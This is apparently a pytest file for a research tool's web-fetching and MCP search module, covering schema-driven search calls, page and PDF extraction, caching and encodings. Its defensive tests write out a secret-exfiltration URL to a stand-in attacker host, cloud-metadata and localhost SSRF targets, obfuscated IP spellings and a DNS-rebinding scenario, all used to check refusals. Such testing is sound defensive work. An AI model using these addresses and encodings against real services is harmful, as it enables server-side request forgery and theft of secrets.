"""Contracts of the web (peresearch.web), with fake HTTP and a fake MCP server: how a search server is called
through its own schema, how its links are read, how a page becomes text, what is cached, and that nothing holding a
secret is ever sent."""

import json

import httpx
import pytest
from hypothesis import HealthCheck, given, settings
from hypothesis import strategies as st

from peresearch import guard, web
from peresearch.web import Unavailable, Web
from tests.helpers import PAGE
from tests.test_guard import CANARIES


class Recorder:
    """A fake HTTP server: answers by URL, records every request."""
    made = []

    def __init__(self, routes):
        self.routes, self.requests = routes, []
        Recorder.made.append(self)

    def client(self):
        def handler(request):
            self.requests.append(request)
            for prefix, answer in self.routes.items():
                if str(request.url).startswith(prefix):
                    return answer(request) if callable(answer) else answer
            return httpx.Response(404)
        return httpx.Client(transport=httpx.MockTransport(handler), follow_redirects=True)


REAL_GETADDRINFO = __import__("socket").getaddrinfo


@pytest.fixture(autouse=True)
def names_resolve_without_the_network(monkeypatch):
    """Host names in these tests are made up: they resolve to a public address, except those named for a private
    one, so no test depends on this machine's DNS."""
    def fake(host, *args, **kwargs):
        ip = {"intranet.example": "10.0.0.7", "router.example": "192.168.1.1"}.get(host, "93.184.215.14")
        return [(2, 1, 6, "", (ip, 0))]
    monkeypatch.setattr(web.socket, "getaddrinfo", fake)


@pytest.fixture(autouse=True)
def no_request_waits_forever():
    """Every request to the network has a time limit: a server that stops answering must not hang the question
    (the agent's own limits are checked only between steps)."""
    Recorder.made.clear()
    yield
    for rec in Recorder.made:
        for r in rec.requests:
            assert all(v is not None for v in r.extensions["timeout"].values()), (str(r.url), r.extensions["timeout"])


class FakeServer:
    """An MCP server as peresearch.mcp.Server shows one: its tools, and the text its calls return."""

    def __init__(self, tools, answer=lambda name, args: "", fail=None):
        self.listed, self.answer, self.fail, self.calls, self.closed = tools, answer, fail, [], False
        self.name = "fake-server"

    def tools(self):
        return self.listed

    def call(self, name, args):
        self.calls.append((name, args))
        if self.fail:
            raise self.fail
        return self.answer(name, args)

    def close(self):
        self.closed = True


def tool(name, props, required=()):
    return {"name": name, "description": "", "inputSchema": {"type": "object", "properties": props,
                                                             "required": list(required)}}


STR, INT, NUM = {"type": "string"}, {"type": "integer"}, {"type": "number"}
# each search server's tools as it lists them, and the call peresearch must make for ("bpe", 3)
SERVERS = {
    "tavily-mcp": ([tool("tavily-search", {"query": STR, "max_results": NUM, "search_depth": STR}, ["query"]),
                    tool("tavily-extract", {"urls": {"type": "array"}})],
                   ("tavily-search", {"query": "bpe", "max_results": 3})),
    "exa": ([tool("web_search_exa", {"query": STR, "numResults": NUM}, ["query"]),
             tool("get_code_context_exa", {"query": STR})], ("web_search_exa", {"query": "bpe", "numResults": 3})),
    "brave": ([tool("brave_local_search", {"query": STR, "count": INT}), tool("brave_web_search", {"query": STR,
                                                                                                   "count": INT})],
              ("brave_web_search", {"query": "bpe", "count": 3})),            # web over local
    "duckduckgo": ([tool("search", {"query": STR, "max_results": INT}, ["query"]), tool("fetch_content", {"url": STR})],
                   ("search", {"query": "bpe", "max_results": 3})),
    "searxng": ([tool("searxng_web_search", {"q": STR, "pageno": INT}, ["q"])], ("searxng_web_search", {"q": "bpe"})),
    "odd": ([tool("lookup_search", {"terms": STR, "limit": INT}, ["terms"])], ("lookup_search", {"terms": "bpe",
                                                                                                "limit": 3})),
    "named": ([tool("search", {"region": STR, "query": STR, "count": INT})], ("search", {"query": "bpe", "count": 3})),
}


@pytest.mark.parametrize("server", SERVERS)
def test_each_search_server_is_called_through_its_own_schema(server):
    """No adapter per provider: the search tool is the one named for a web search, its query the string property
    named like one (else the first required string), its count the number property named like one."""
    tools, want = SERVERS[server]
    fake = FakeServer(tools, lambda name, args: "Title: BPE\nURL: https://example.org/bpe")
    found = web.McpSearch(fake).search("bpe", 3)
    assert fake.calls == [want] and found.links == [("BPE", "https://example.org/bpe")]
    assert found.provider == f"{want[0]} on fake-server" and found.text == "Title: BPE\nURL: https://example.org/bpe"


def test_the_search_tool_can_be_named_and_a_server_without_one_is_said():
    tools = SERVERS["brave"][0]
    fake = FakeServer(tools)
    web.McpSearch(fake, tool="brave_local_search").search("bpe", 2)
    assert fake.calls == [("brave_local_search", {"query": "bpe", "count": 2})]
    with pytest.raises(Unavailable, match=r"fake-server offers no search tool \(its tools: fetch\); set "
                                          r"PERESEARCH_SEARCH_TOOL"):
        web.McpSearch(FakeServer([tool("fetch", {"url": STR})])).search("bpe", 2)
    with pytest.raises(Unavailable, match="no tool missing on fake-server"):
        web.McpSearch(FakeServer(tools), tool="missing").search("bpe", 2)


@pytest.mark.parametrize("text, links", [
    ("1. [BPE explained](https://example.org/bpe) — merges pairs\n2. [Again](https://example.org/bpe)",
     [("BPE explained", "https://example.org/bpe")]),                                     # once, its first title
    ("Title: Neural BPE\nURL: https://arxiv.org/abs/1508.07909\nContent: …",
     [("Neural BPE", "https://arxiv.org/abs/1508.07909")]),                               # Tavily's and Exa's text
    ("See https://example.org/a. And (https://example.org/b), or <https://example.org/c>!",
     [("", "https://example.org/a"), ("", "https://example.org/b"), ("", "https://example.org/c")]),
    ("no link at all", []),
])
def test_links_are_read_from_whatever_text_a_server_returns(text, links):
    assert web.links(text) == links


def test_without_a_search_server_there_is_no_web_search_and_failures_are_said(home, monkeypatch):
    for name in ("PERESEARCH_SEARCH_MCP", "PERESEARCH_SEARCH_TOOL", "PERESEARCH_SEARCH_MCP_KEY"):
        monkeypatch.delenv(name, raising=False)
    w = Web(http=object(), cache=home / "web")
    assert w.searcher is None and w.cache == home / "web"
    with pytest.raises(Unavailable, match="no web search is set: add a search MCP server in /setup"):
        w.search("bpe")
    from peresearch.mcp import MCPError
    down = Web(web.McpSearch(FakeServer(SERVERS["exa"][0], fail=MCPError("fake-server: exited (1)"))), http=object(),
               cache=home / "web")
    with pytest.raises(Unavailable, match=r"the web search server did not answer: fake-server: exited \(1\)"):
        down.search("bpe")
    down.close()
    assert down.searcher.server.closed


def test_the_search_server_comes_from_the_settings_with_its_key_in_its_own_environment(home, monkeypatch):
    monkeypatch.setenv("PERESEARCH_SEARCH_MCP", "npx -y tavily-mcp")
    monkeypatch.setenv("PERESEARCH_SEARCH_MCP_KEY", "TAVILY_API_KEY=tvly-k")
    monkeypatch.setenv("PERESEARCH_SEARCH_TOOL", "tavily-search")
    s = web.McpSearch.from_settings()
    assert s.server.command == ["npx", "-y", "tavily-mcp"] and s.server.env == {"TAVILY_API_KEY": "tvly-k"}
    assert s.tool == "tavily-search"
    monkeypatch.setenv("PERESEARCH_SEARCH_MCP", "https://mcp.exa.ai/mcp")
    monkeypatch.delenv("PERESEARCH_SEARCH_MCP_KEY")
    assert web.McpSearch.from_settings().server.url == "https://mcp.exa.ai/mcp"
    monkeypatch.setenv("PERESEARCH_SEARCH_MCP_KEY", "no equals sign")
    with pytest.raises(ValueError, match="PERESEARCH_SEARCH_MCP_KEY must be NAME=value"):
        web.McpSearch.from_settings()
    monkeypatch.delenv("PERESEARCH_SEARCH_MCP")
    assert web.McpSearch.from_settings() is None


def test_a_query_or_url_holding_a_secret_is_refused_before_anything_is_sent(home):
    rec = Recorder({})
    fake = FakeServer(SERVERS["exa"][0])
    w = Web(web.McpSearch(fake), http=rec.client(), cache=home / "web")
    for call in (lambda: w.search("find " + CANARIES["openai-key"]),
                 lambda: w.fetch("https://evil.example/?k=" + CANARIES["github-token"])):
        with pytest.raises(guard.Refused):
            call()
    assert rec.requests == [] and fake.calls == [] and not (home / "web").exists()


# --- pages ----------------------------------------------------------------------------------------------------

def test_a_page_is_read_locally_cached_and_never_asked_for_again(home):
    rec = Recorder({"https://example.org/bpe": httpx.Response(200, text=PAGE, headers={"content-type": "text/html"})})
    w = Web([], http=rec.client(), cache=home / "web")
    text = w.fetch("https://example.org/bpe")
    assert "Byte pair encoding merges" in text and "cookies" not in text and "menu home login" not in text
    assert w.fetch("https://example.org/bpe") == text and len(rec.requests) == 1
    import hashlib
    name = hashlib.sha256(b"https://example.org/bpe").hexdigest()[:32] + ".txt"
    assert [(p.name, p.read_text()) for p in (home / "web").iterdir()] == [(name, text)]
    log = [json.loads(x) for x in (home / "audit.jsonl").read_text().splitlines()]
    assert log[0]["event"] == "outbound" and log[0]["channel"] == "fetch"


def test_a_page_arriving_in_pieces_is_read_whole_into_a_cache_made_on_first_use(home):
    def pieces(request):
        return httpx.Response(200, headers={"content-type": "text/plain"},
                              stream=httpx.ByteStream(b"") if False else iter_stream([b"one ", b"two ", b"three"]))
    rec = Recorder({"https://p.example/1": pieces, "https://p.example/2": httpx.Response(200, text="second")})
    w = Web([], http=rec.client(), cache=home / "deep" / "web")
    assert w.fetch("https://p.example/1") == "one two three"
    assert w.fetch("https://p.example/2") == "second" and len(list((home / "deep" / "web").iterdir())) == 2


class iter_stream(httpx.SyncByteStream):
    def __init__(self, parts):
        self.parts = parts

    def __iter__(self):
        yield from self.parts


@pytest.mark.parametrize("key", ["", "jina-k"])
def test_a_page_without_text_goes_to_the_reader_once_only_when_the_user_set_its_key(home, monkeypatch, key):
    """The Jina Reader is a third party: a URL goes there only when the user set its key (on 30 sample pages it read
    2 the local reader could not, runs/e2e/page-reader-2026-10-08.json); without, the page is said unread."""
    monkeypatch.setenv("JINA_API_KEY", key)
    rec = Recorder({"https://app.example": httpx.Response(200, text="<html><body><script>x()</script></body></html>",
                                                          headers={"content-type": "text/html"}),
                    "https://r.jina.ai/": httpx.Response(200, text="  rendered  ")})
    w = Web([], http=rec.client(), cache=home / "web")
    want = "rendered" if key else ""
    assert w.fetch("https://app.example") == want and w.fetch("https://app.example") == want
    if key:
        assert [str(r.url) for r in rec.requests] == ["https://app.example", "https://r.jina.ai/https://app.example"]
        assert rec.requests[-1].headers.get("authorization") == "Bearer jina-k"
    else:
        assert [str(r.url) for r in rec.requests] == ["https://app.example"] * 2    # tried again, never the reader


def test_a_page_nobody_can_read_is_empty_logged_and_not_cached(home, monkeypatch):
    monkeypatch.setenv("JINA_API_KEY", "jina-k")
    rec = Recorder({"https://down.example": httpx.Response(500), "https://r.jina.ai/": httpx.Response(429)})
    w = Web([], http=rec.client(), cache=home / "web")
    assert w.fetch("https://down.example") == "" and not (home / "web").exists()
    events = [json.loads(x)["event"] for x in (home / "audit.jsonl").read_text().splitlines()]
    assert "fetch_failed" in events

    def broken(request):
        raise httpx.ConnectError("no route")
    rec2 = Recorder({"https://x.example": broken, "https://r.jina.ai/": broken})
    assert Web([], http=rec2.client(), cache=home / "web").fetch("https://x.example") == ""
    events = [json.loads(x) for x in (home / "audit.jsonl").read_text().splitlines()]
    assert events[-1] == {**events[-1], "event": "reader_failed", "error": "ConnectError"}


def test_a_page_is_read_up_to_its_size_limit(home, monkeypatch):
    monkeypatch.setattr(web, "MAX_PAGE_BYTES", 1000)
    rec = Recorder({"https://big.example": httpx.Response(200, content=b"y" * 5000, headers={"content-type": "text/plain"})})
    text = Web([], http=rec.client(), cache=home / "web").fetch("https://big.example")
    assert 1000 < len(text) <= 5000 and set(text) == {"y"}


def test_extract_takes_html_pdf_and_plain_text():
    pymupdf = pytest.importorskip("pymupdf")
    doc = pymupdf.open()
    doc.new_page().insert_text((72, 72), "pdf words")
    pdf = doc.tobytes()
    assert web.extract(pdf, "application/pdf", "https://x/doc") == "[p. 1]\npdf words"
    assert web.extract(pdf, "application/octet-stream", "https://x/paper.PDF") == "[p. 1]\npdf words"
    assert web.extract(pdf, "", "https://x/download?id=3") == "[p. 1]\npdf words"          # known by its first bytes
    two = pymupdf.open()
    two.new_page().insert_text((72, 72), "first")
    two.new_page().insert_text((72, 72), "second")
    assert web.extract(two.tobytes(), "application/pdf", "https://x/d") == "[p. 1]\nfirst\n\n\n[p. 2]\nsecond"
    table = "<!DOCTYPE html><html><body><article><p>" + "Intro text long enough to keep. " * 5 + "</p><table><tr><td>" \
        "cellvalue</td></tr></table></article></body></html>"
    assert "cellvalue" in web.extract(table.encode(), "", "https://x/t")             # sniffed, tables kept
    assert "Byte pair encoding merges" in web.extract(PAGE.encode(), "text/html; charset=utf-8", "https://x")
    assert "Byte pair encoding merges" in web.extract(PAGE.encode(), "text/plain", "https://x")      # sniffed
    assert web.extract("  plain café \n".encode() + b"\xff", "text/plain", "https://x") == "plain café \n�".strip()


# --- found while checking the web for other users (sub-architecture 3) -----------------------------------------

def _paper(pages: int = 4) -> bytes:
    pymupdf = pytest.importorskip("pymupdf")
    d = pymupdf.open()
    for i in range(pages):
        page = d.new_page()
        page.insert_text((72, 40), "Journal of Tests, Vol. 3")              # a running head
        page.insert_text((72, 300), f"Finding number {i + 1} of the paper.")
    return d.tobytes()


def test_a_pdf_larger_than_a_page_limit_is_read_whole_through_the_converter(home, monkeypatch):
    """Papers run to tens of MB (Llama 2: 13.6 MB): a PDF has its own limit and is read by the document converter
    (running heads dropped, pages marked), not cut at the HTML limit into a file nobody can open."""
    pdf = _paper()
    monkeypatch.setattr(web, "MAX_PAGE_BYTES", 1000)
    assert len(pdf) > 1000
    rec = Recorder({"https://arxiv.example/pdf/1": httpx.Response(200, content=pdf,
                                                                  headers={"content-type": "application/pdf"})})
    text = Web([], http=rec.client(), cache=home / "web").fetch("https://arxiv.example/pdf/1")
    assert text == "\n\n".join(f"[p. {i + 1}]\nFinding number {i + 1} of the paper.\n" for i in range(4)).strip()
    monkeypatch.setattr(web, "MAX_PDF_BYTES", 1000)
    assert Web([], http=rec.client(), cache=home / "web2").fetch("https://arxiv.example/pdf/1") == ""


@pytest.mark.parametrize("encoding, header, meta", [
    ("gbk", "text/html", '<meta charset="gbk">'),                           # the page says it in a meta tag
    ("shift_jis", "text/html; charset=Shift_JIS", ""),                      # the server says it
    ("euc-kr", "text/html", '<meta http-equiv="Content-Type" content="text/html; charset=euc-kr">'),
    ("cp1258", "text/html", ""),                                            # nobody says it: guessed
])
def test_a_page_is_read_in_the_encoding_it_was_written_in(encoding, header, meta):
    from tests.test_parse_chunk import cp1258
    text = {"gbk": "机器学习是人工智能的一个分支，它研究计算机如何从数据中学习。",
            "shift_jis": "機械学習は人工知能の一分野であり、データから学習する方法を研究する。",
            "euc-kr": "기계 학습은 인공 지능의 한 분야로 컴퓨터가 데이터로부터 배우는 방법을 연구한다.",
            "cp1258": "Học máy là một nhánh của trí tuệ nhân tạo, nghiên cứu cách máy tính học từ dữ liệu."}[encoding]
    page = (f"<!DOCTYPE html><html><head>{meta}<title>t</title></head><body><article><p>" + (text + " ") * 4
            + "</p></article></body></html>")
    body = cp1258(page) if encoding == "cp1258" else page.encode(encoding)
    assert text in web.extract(body, header, "https://x/page")


def test_fetch_never_reaches_this_machine_or_its_network(home):
    """A page in the search results may point, or redirect, to localhost or a private address (the local model
    server, a router, a cloud metadata service): refused before any request leaves."""
    rec = Recorder({"https://evil.example/": httpx.Response(302, headers={"location": "http://127.0.0.1:8000/v1/models"}),
                    "http://127.0.0.1": httpx.Response(200, text="LOCAL SECRET"),
                    "http://169.254.169.254": httpx.Response(200, text="METADATA"),
                    "http://10.0.0.5": httpx.Response(200, text="INTRANET"),
                    "https://r.jina.ai/": httpx.Response(200, text="READER")})
    w = Web([], http=rec.client(), cache=home / "web")
    for url in ("http://127.0.0.1:8000/v1/models", "http://169.254.169.254/latest/meta-data/", "http://10.0.0.5/",
                "http://[::1]/", "http://localhost/", "http://intranet.example/wiki", "https://evil.example/"):
        assert w.fetch(url) == "", url
    assert [str(r.url) for r in rec.requests] == ["https://evil.example/"]   # the redirect was not followed
    assert not (home / "web").exists()


@pytest.mark.parametrize("ctype, body", [("application/zip", b"PK\x03\x04" + b"\x00" * 50),
                                         ("image/png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 50),
                                         ("", b"\x00\x01\x02 binary")])
def test_a_file_that_is_not_text_is_not_read_as_text(home, ctype, body):
    rec = Recorder({"https://x.example/f": httpx.Response(200, content=body, headers={"content-type": ctype} if ctype else {}),
                    "https://r.jina.ai/": httpx.Response(200, text="READER")})
    assert Web([], http=rec.client(), cache=home / "web").fetch("https://x.example/f") == ""
    assert [str(r.url) for r in rec.requests] == ["https://x.example/f"]    # nor sent to the reader


def test_the_page_cache_is_utf8_on_a_machine_whose_locale_is_not(tmp_path):
    """Windows and a POSIX locale default to another encoding: the cache must not depend on it."""
    import os
    import subprocess
    import sys
    script = tmp_path / "run.py"                                        # ASCII source: the locale cannot break it
    script.write_text(
        "import httpx\nfrom pathlib import Path\nfrom peresearch.web import Web\n"
        "WORDS = 'H\\u1ecdc m\\u00e1y ph\\u1edf'\n"
        "t = httpx.Client(transport=httpx.MockTransport(lambda r: httpx.Response(200, content=WORDS.encode('utf-8'),"
        " headers={'content-type': 'text/plain; charset=utf-8'})))\n"
        f"w = Web([], http=t, cache=Path({str(tmp_path / 'web')!r}))\n"
        "assert w.fetch('https://x.example/a') == WORDS\n"
        "assert w.fetch('https://x.example/a') == WORDS\n", encoding="ascii")
    env = {**os.environ, "PYTHONUTF8": "0", "PYTHONCOERCECLOCALE": "0", "LC_ALL": "C", "LANG": "C",
           "PERESEARCH_HOME": str(tmp_path / "home")}
    r = subprocess.run([sys.executable, str(script)], env=env, capture_output=True)
    assert r.returncode == 0, r.stderr.decode("utf-8", "replace")[-600:]


LOCAL_NETWORKS = ["127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "169.254.0.0/16", "100.64.0.0/10",
                  "0.0.0.0/8", "224.0.0.0/4", "240.0.0.0/4", "::1/128", "fe80::/10", "fc00::/7", "::/128"]


def spellings(a):
    """The ways a URL can name one address: what a resolver (inet_aton) and ipaddress accept, without DNS."""
    if a.version == 6:
        return [f"[{a}]", f"[{a.exploded}]"]
    b = a.packed
    return [str(a), str(int(a)), hex(int(a)), ".".join(f"0{x:o}" for x in b), f"{b[0]}.{int.from_bytes(b[1:], 'big')}",
            f"[::ffff:{a}]"]


@given(st.sampled_from(LOCAL_NETWORKS).flatmap(lambda n: st.ip_addresses(network=n)) | st.ip_addresses(v=4),
       st.integers(0, 5), st.sampled_from(["http", "https"]), st.sampled_from(["", ":8000"]))
@settings(max_examples=300, suppress_health_check=[HealthCheck.function_scoped_fixture])   # the same patch each time
def test_addresses_written_in_other_forms_are_still_recognized(monkeypatch, address, form, scheme, port):
    """This machine, a private, link-local, shared or reserved address is never public, however it is written
    (dotted, one integer, hex, octal parts, short forms, IPv4 in IPv6); a public one stays public in its numeric forms
    (the IPv6 form of a public IPv4 address is not asserted: refusing it would be safe)."""
    monkeypatch.setattr(web.socket, "getaddrinfo", REAL_GETADDRINFO)    # numeric forms need no network
    forms = spellings(address)
    host = forms[form % len(forms)]
    url = f"{scheme}://{host}{port}/v1/models"
    if not address.is_global:
        assert web.public(url) is False, url
    elif not host.startswith("[::ffff:"):
        assert web.public(url) is True, url
    for named, ok in (("http://0.0.0.0:8000/", False), ("http://8.8.8.8/", True), ("https:///nohost", False),
                      ("http://0x7f.0.0.1/", False)):
        assert web.public(named) is ok, named


# --- what the mutation run of 2026-10-03 showed no test held ----------------------------------------------------

@pytest.mark.parametrize("ctype, head", [("text/html; charset=ISO-8859-1", ""),
                                         ("text/html", '<meta charset="iso-8859-1">'),
                                         ("text/plain; charset=latin-1", None)])
def test_a_declared_encoding_is_used_where_guessing_cannot_tell(ctype, head):
    """A few bytes are too few to guess from: what the server or the page declares decides."""
    word = "Café Ångström"
    body = (word if head is None else f"<html><head>{head}</head><body><article><p>{word}</p></article></body></html>")
    assert word in web.extract(body.encode("latin-1"), ctype, "https://x/p")


def test_a_byte_order_mark_wins_and_bad_bytes_do_not_stop_a_page():
    assert web.extract(codecs_bom() + "naïve".encode("utf-8"), "text/plain; charset=iso-8859-1", "https://x") == "naïve"
    assert web.extract(b"ok \xff end", "text/plain; charset=utf-8", "https://x") == "ok � end"


def codecs_bom():
    import codecs
    return codecs.BOM_UTF8


def test_html_is_found_by_its_type_or_its_first_bytes_and_reduced_to_text():
    article = "<article><p>" + "Intro text long enough to keep. " * 5 + "</p><table><tr><td>cellvalue</td></tr></table>" \
        "</article>"
    for body, ctype in ((f"<html><body>{article}</body></html>", ""), (f"\n\n  <!DOCTYPE html><html><body>{article}"
                        "</body></html>", ""), (f"<HTML><body>{article}</body></HTML>", ""),
                        (f"<body>{article}</body>", "text/html")):
        out = web.extract(body.encode(), ctype, "https://x/t")
        assert "Intro text" in out and "<" not in out, (ctype, body[:20])
        assert "cellvalue" in out or body.startswith("<body>")              # trafilatura drops a fragment's table


@pytest.mark.parametrize("ctype", ["application/zip", "image/svg-or-not", "video/mp4"])
def test_a_type_that_is_not_text_is_refused_even_without_a_nul_byte(ctype):
    assert web.extract(b"PK" + b"a" * 200, ctype, "https://x/f") is None


def test_a_scanned_pdf_has_no_text():
    pymupdf = pytest.importorskip("pymupdf")
    d = pymupdf.open()
    d.new_page()
    assert web.extract(d.tobytes(), "application/pdf", "https://x/scan.pdf") == ""


def test_redirects_between_public_pages_are_followed_up_to_the_limit(home):
    hop = {f"https://a.example/{i}": httpx.Response(302, headers={"location": f"/{i + 1}"}) for i in range(7)}
    hop["https://a.example/5"] = httpx.Response(200, text="five hops", headers={"content-type": "text/plain"})
    hop["https://a.example/6"] = httpx.Response(301, headers={"location": "https://b.example/end"})
    hop["https://b.example/end"] = httpx.Response(200, text="moved", headers={"content-type": "text/plain"})
    rec = Recorder(hop)
    w = Web([], http=rec.client(), cache=home / "web")
    assert w.fetch("https://a.example/0") == "five hops"                    # 5 redirects: allowed
    assert w.fetch("https://a.example/6") == "moved"                        # an absolute one, to another site
    rec2 = Recorder({**hop, "https://a.example/5": httpx.Response(302, headers={"location": "/6"}),
                     "https://a.example/6": httpx.Response(302, headers={"location": "/7"})})
    assert Web([], http=rec2.client(), cache=home / "web2").fetch("https://a.example/0") == ""      # 6: refused
    events = [json.loads(x) for x in (home / "audit.jsonl").read_text().splitlines()]
    assert {"event": "fetch_refused", "reason": "too many redirects"} in [
        {k: v for k, v in e.items() if k != "time"} for e in events]


@pytest.mark.parametrize("url, ok", [("http://printer.local/", False), ("http://app.localhost/", False),
                                     ("http://linklocal.example/", False), ("http://unresolvable.example/", True)])
def test_names_are_judged_by_what_they_resolve_to(monkeypatch, url, ok):
    def fake(host, *args, **kwargs):
        if host == "unresolvable.example":                  # fails by itself when fetched
            raise web.socket.gaierror("no such name")
        return [(10, 1, 6, "", ("fe80::1%eth0" if host == "linklocal.example" else "93.184.215.14", 0, 0, 2))]
    monkeypatch.setattr(web.socket, "getaddrinfo", fake)
    assert web.public(url) is ok


def test_a_page_and_a_pdf_arriving_in_pieces_keep_their_own_limits(home, monkeypatch):
    monkeypatch.setattr(web, "MAX_PAGE_BYTES", 1000)
    pdf = _paper()
    rec = Recorder({"https://x.example/text": lambda r: httpx.Response(200, headers={"content-type": "text/plain"},
                                                                       stream=iter_stream([b"y" * 500] * 10)),
                    "https://x.example/paper": lambda r: httpx.Response(200, headers={"content-type": "application/pdf"},
                                                                        stream=iter_stream([pdf[i:i + 500] for i in
                                                                                            range(0, len(pdf), 500)]))})
    w = Web([], http=rec.client(), cache=home / "web")
    assert w.fetch("https://x.example/text") == "y" * 1500                  # cut just past the page limit
    assert w.fetch("https://x.example/paper").startswith("[p. 1]\nFinding number 1")   # a PDF read whole
    monkeypatch.setattr(web, "MAX_PDF_BYTES", 1000)
    assert Web([], http=rec.client(), cache=home / "web2").fetch("https://x.example/paper") == ""
    events = [{k: v for k, v in json.loads(x).items() if k != "time"} for x in (home / "audit.jsonl").read_text().splitlines()]
    assert {"event": "fetch_refused", "reason": "PDF too large"} in events


def test_refusals_and_failures_are_recorded_with_their_reason(home):
    rec = Recorder({"https://down.example": httpx.Response(503), "https://r.jina.ai/": httpx.Response(429)})
    w = Web([], http=rec.client(), cache=home / "web")
    w.fetch("https://down.example")
    w.fetch("http://127.0.0.1/")
    events = [{k: v for k, v in json.loads(x).items() if k not in ("time", "chars", "redacted")}
              for x in (home / "audit.jsonl").read_text().splitlines()]
    assert {"event": "fetch_failed", "error": "HTTPStatusError"} in events
    assert {"event": "fetch_refused", "reason": "not a public address"} in events


def test_the_real_client_names_itself():
    assert web._http().headers["user-agent"] == web.USER_AGENT


@pytest.mark.parametrize("url, kind", [
    ("https://arxiv.org/abs/1706.03762", "preprint server"), ("https://www.biorxiv.org/x", "preprint server"),
    ("https://doi.org/10.1038/x", "scholarly publisher"), ("https://link.springer.com/a", "scholarly publisher"),
    ("https://aclanthology.org/2020.acl-main.1", "scholarly publisher"), ("https://openreview.net/forum?id=x", "peer review site"),
    ("https://cs.stanford.edu/x", "university"), ("https://www.ox.ac.uk/x", "university"),
    ("https://hust.edu.vn/x", "university"), ("https://www.u-tokyo.ac.jp/x", "university"),
    ("https://www.nih.gov/x", "government"), ("https://chinhphu.gov.vn/x", "government"),
    ("https://www.mext.go.jp/x", "government"), ("https://vi.wikipedia.org/wiki/X", "encyclopedia"),
    ("https://github.com/a/b", "code repository"), ("https://huggingface.co/x", "code repository"),
    ("https://stackoverflow.com/q/1", "forum"), ("https://www.reddit.com/r/x", "forum"),
    ("https://medium.com/@a/x", "blog"), ("https://x.substack.com/p/y", "blog"), ("https://www.youtube.com/watch", "video"),
    ("https://example.com/page", "web page"), ("https://notedu.com/x", "web page"),    # ".edu" must be a label
])
def test_a_result_says_what_kind_of_site_it_comes_from(url, kind):
    assert web.site_kind(url) == kind


def test_a_page_is_fetched_from_the_address_that_was_checked(home, monkeypatch):
    """DNS rebinding: a name that answers a public address when checked and a private one when connected to. The
    request goes to the checked address (the Host header and TLS name stay the site's), and each hop resolves once."""
    answers = iter(["93.184.215.14", "127.0.0.1", "127.0.0.1"])
    asked = []

    def rebinding(host, *args, **kwargs):
        asked.append(host)
        return [(2, 1, 6, "", (next(answers), 0))]
    monkeypatch.setattr(web.socket, "getaddrinfo", rebinding)
    seen = []

    def handler(request):
        seen.append((request.url.host, request.url.port, request.headers["host"], request.extensions.get("sni_hostname")))
        return httpx.Response(200, text="public page", headers={"content-type": "text/plain"})
    w = Web([], http=httpx.Client(transport=httpx.MockTransport(handler)), cache=home / "web", pin=True)
    assert w.fetch("https://pages.example:8443/a") == "public page"
    assert seen == [("93.184.215.14", 8443, "pages.example:8443", "pages.example")] and asked == ["pages.example"]
    assert w.fetch("http://[2606:2800:220:1::]/b") == "public page"                  # an address: nothing to resolve
    assert seen[-1][:3] == ("2606:2800:220:1::", None, "[2606:2800:220:1::]") and asked == ["pages.example"]


def test_the_real_client_pins_and_an_injected_one_does_not_unless_asked():
    assert Web([]).pin is True
    assert Web([], http=httpx.Client()).pin is False


def test_the_search_check_says_what_ships_what_is_added_and_that_it_answers(home, monkeypatch):
    for name in ("PERESEARCH_SEARCH_MCP", "TAVILY_API_KEY", "EXA_API_KEY"):
        monkeypatch.delenv(name, raising=False)
    assert web.check(None) == [
        "web search: none set — what ships: arXiv, Semantic Scholar and Wikipedia (search_papers, search_wikipedia) "
        "and reading a page; add a search MCP server in /setup (e.g. npx -y tavily-mcp, https://mcp.exa.ai/mcp, a "
        "DuckDuckGo or SearXNG server)"]
    monkeypatch.setenv("TAVILY_API_KEY", "tvly-old")                     # a key of the old adapters
    assert web.check(None)[1] == ("your settings hold TAVILY_API_KEY: Tavily's MCP server takes it — "
                                  "PERESEARCH_SEARCH_MCP=npx -y tavily-mcp, PERESEARCH_SEARCH_MCP_KEY=TAVILY_API_KEY=…")
    ok = web.McpSearch(FakeServer(SERVERS["exa"][0], lambda n, a: "Title: A\nURL: https://a.org\n\nhttps://b.org"))
    line = web.check(ok)[0]
    assert line.startswith("web search: web_search_exa on fake-server · answered in ") and line.endswith(" · 2 links")
    from peresearch.mcp import MCPError
    down = web.McpSearch(FakeServer(SERVERS["exa"][0], fail=MCPError("fake-server: 401 missing api key")))
    assert web.check(down) == ["web search: FAILED: the web search server did not answer: fake-server: 401 missing "
                               "api key"]
